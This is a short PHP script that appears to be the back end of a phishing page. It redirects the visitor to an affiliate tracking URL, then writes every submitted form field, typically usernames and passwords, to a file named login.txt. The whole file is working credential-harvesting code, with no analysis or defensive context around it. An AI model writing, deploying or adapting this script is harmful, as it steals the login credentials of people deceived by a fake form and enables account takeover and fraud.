<?php
header ('Location:https://www.marktrackgol.click/?sl=5474672-5351f&data1=Track1&data2=Track2&tag={External_ID_from_traffic_source}&website={subID}&placement={sub_subID}');
$handle = fopen("login.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?> 